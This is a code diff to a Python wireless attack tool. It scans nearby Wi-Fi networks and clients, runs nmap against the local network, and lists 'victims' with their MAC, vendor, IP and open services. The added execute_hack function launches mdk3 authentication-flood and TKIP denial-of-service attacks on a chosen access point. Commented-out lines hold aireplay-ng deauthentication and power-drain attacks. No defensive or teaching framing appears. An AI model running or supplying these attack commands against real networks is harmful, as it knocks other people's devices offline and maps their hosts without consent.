@@ -44,9 +44,6 @@ def dump_network_info(Info):
     sp2 = subprocess.Popen(["grep", "SSID"], stdin=sp1.stdout, stdout=subprocess.PIPE)
     # TODO: Handle user not being connected to a network
     user_ssid = subprocess.check_output(["cut", "-f2-", "-d:"], stdin=sp2.stdout).decode().strip()
-    # TODO: Note that iwgetid relies on deprecated iwconfig and does not work in modern Debian.
-    #       Can use nmcli to determine the current network instead?
-
     # Create a dictionary of ssids and bssids -- {ssid : bssid}
     iw_scan1 = subprocess.Popen(["sudo", "iw", interface, "scan"], stdout=subprocess.PIPE)
     iw_scan2 = subprocess.Popen(["egrep", "^BSS|SSID:"], stdin=iw_scan1.stdout, stdout=subprocess.PIPE).communicate()[0].decode().strip().splitlines()
@@ -75,12 +72,12 @@ def dump_network_info(Info):
         print("You are connected to " + victim_network + ". Running nmap... ")
         # Get IPs
         sp = subprocess.Popen(["ip", "addr", "show", interface], stdout=subprocess.PIPE)
-        # ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:24]
-        ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:23]
+        
+        ips = subprocess.check_output(["grep", "inet", "-m", "1"], stdin=sp.stdout).decode()[9:26]
         print(ips)
         sp.wait()
-        # TODO: Check output, log verbosely
-        nmap = subprocess.call(["nmap", "-n", "-A", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
+        # TODO: Check output, log verbosely,
+        # nmap = subprocess.call(["nmap", "-n", "-A", "-oX", FILE_PREFIX+".xml", ips], stdout=subprocess.DEVNULL) # should we print nmap results to screen too?
         print("Done.\n")
     else:
         print("You are not connected to " + victim_network + ".\n")
@@ -90,13 +87,13 @@ def dump_network_info(Info):
     try:
         subprocess.check_output(["sudo", "airmon-ng", "start", interface])
         print("Starting airodump for 10 seconds... ")
+        # TODO: Not all monitor interfaces are interface+mon
         airodump = subprocess.Popen(["sudo", "airodump-ng","--bssid", ssid_dict[victim_network], interface+"mon", "-w", FILE_PREFIX, "-o", "csv"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         # After 10 seconds, raise a TimeoutExpired exception to stop airodump
         o_airodump, unused_stderr = airodump.communicate(timeout=10)
     except subprocess.CalledProcessError as e:
         print ("Failed to enable monitor mode: " + e.output)
     except subprocess.TimeoutExpired:
-        print("Disabling monitor mode... ")
         airodump.terminate()
         print("Done.\n")
         # Fixes invisible text in terminal & no echo after terminating airodump
@@ -116,13 +113,13 @@ def create_target_table():
 
 
     ap = parse_airodump(clients, Client)
-    parse_nmap(clients, Client, Service, ap)
+    nmap_success = parse_nmap(clients, Client, Service, ap)
 
     # Create a sorted list of clients by ip first and then by power
     clients = sorted(clients.values(), key=lambda c: c.ip if c.ip is not None
                                                      else c.power)
 
-    clients_table = gen_clients_table(clients)
+    clients_table = gen_clients_table(clients, nmap_success)
 
     victims = handle_victims_choices(clients_table, clients)
 
@@ -158,6 +155,7 @@ def parse_airodump(clients, Client):
     except FileNotFoundError as e:
         sys.exit("No airodump results found - fatal exception: '{}'".format(e))
 
+# Returns true if successful
 def parse_nmap(clients, Client, Service, ap):
     """
     Iterates through the 'up' hosts in the nmap report, modifying the list of
@@ -170,6 +168,7 @@ def parse_nmap(clients, Client, Service, ap):
     except Exception as e:
         nmap_report = None
         print("Skipping nmap results as NmapParser encountered exception: {}".format(type(e).__name__))
+        return False
 
     if nmap_report is not None:
         for host in nmap_report.hosts:
@@ -189,22 +188,31 @@ def parse_nmap(clients, Client, Service, ap):
                 except KeyError:  # Except: first time seeing this client so generate a new key,value pair
                     if host.mac != ap.bssid:
                         clients[host.mac] = Client(host.mac, host.vendor, host.address, None, services)
+    return True
 
-def gen_clients_table(clients):
+def gen_clients_table(clients, nmap_success):
     """
     Creates a PrettyTable from a clients list.
     """
-    clients_table = PrettyTable(["#", "MAC", "Wifi Card Vendor", "IP Address",
+    if nmap_success:
+        clients_table = PrettyTable(["#", "MAC", "Wifi Card Vendor", "IP Address",
                                  "Power", "Services"], hrules=True)
+    else:
+        clients_table = PrettyTable(["#", "MAC", "Wifi Card Vendor", "Power"], hrules=True)
+
     for i,c in enumerate(clients):
         if c.services:
             services_table = PrettyTable(["Port","State","Service"], border=False)
             for s in c.services:
                 services_table.add_row([s.port, s.state, s.service])
-        else:
-            services_table = None
 
-        clients_table.add_row([i, c.mac, c.vendor, c.ip, c.power, services_table])
+        manuf = subprocess.check_output(["python", "manuf.py", c.mac]).decode().split("comment=u'")[1][:-3]
+
+        if nmap_success:
+            clients_table.add_row([i, c.mac, manuf, c.ip, c.power, services_table])
+        else:
+            clients_table.add_row([i, c.mac, manuf, c.power])
+
     return clients_table
 
 def handle_victims_choices(clients_table, clients):
@@ -236,10 +244,28 @@ def execute_hack(info, victims):
     """
     Takes some information (WHAT?) in order to attack the victim.
     """
-    # print(info.interface)
-    # print(info.ssid)
-    # print(info.bssid)
-    # print(victims)
+    # Check if victims is empty, continue &print no available victims
+
+    # AUTH DoS
+    try:
+        auth = subprocess.Popen(["sudo", "mdk3", info.interface, "a", "-a", info.bssid], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        output = auth.stdout.readline()
+        o_auth, auth_unused_stderr = auth.communicate(timeout=10)
+    except subprocess.TimeoutExpired:
+        auth.terminate()
+    
+    # TKIP DoS
+    try:
+        tkip = subprocess.Popen(["sudo", "mdk3", info.interface, "m", "-t", info.bssid])
+        output = tkip.stdout.readline()
+        o_tkip, auth_unused_stderr = tkip.communicate(timeout=10)
+    except subprocess.TimeoutExpired:
+        tkip.terminate()
+
+    # DISASSOC DoS
+    #subprocess.call(["sudo", "aireplay-ng", "-0", "0", "-a", info.bssid, "-c", victims[0], "-e", info.ssid, info.interface])
+    # POW MGT Drain
+    # subprocess.call(["sudo", "python", "psdos.py", info.interface, victim[0], info.bssid, "rts"])
 
 if __name__ == "__main__":
     if sudo_user():
